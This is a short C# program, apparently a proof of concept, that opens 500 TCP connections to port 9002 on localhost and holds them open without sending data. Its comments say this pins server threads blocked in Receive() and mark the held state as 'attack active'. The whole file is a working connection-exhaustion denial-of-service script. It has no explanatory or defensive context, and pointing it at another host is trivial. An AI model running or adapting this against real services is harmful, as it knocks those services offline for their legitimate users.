using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Program
{
    static void Main()
    {
        try
        {


            var sockets = new List<Socket>();
            Thread.Sleep(2000);
            for (int i = 0; i < 500; i++)
            {

                var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //s.Connect("127.0.0.1", 9002);
                s.Connect(IPAddress.Loopback, 9002);

                // THREAD PINNING ONLY OCCURS WHEN THE CLIENT SENDS NO DATA; SENDING DATA RELEASES THE BLOCKING RECEIVE()
                //s.Send(Encoding.UTF8.GetBytes("COMMIT"));
                //var buf = new byte[1024];
                //int n = s.Receive(buf);
                //Console.WriteLine(Encoding.UTF8.GetString(buf, 0, n));



                sockets.Add(s);


                Console.WriteLine($"[+] Opened connection {i + 1}");

                Thread.Sleep(50); // slow ramp
            }

            Console.WriteLine("[*] All sockets opened. Not sending data...");
            Console.ReadLine(); // HOLD = attack active
        }
        catch (Exception ex)
        {

            Console.WriteLine("[*] Error: " + ex.Message); ;
        }
    }
}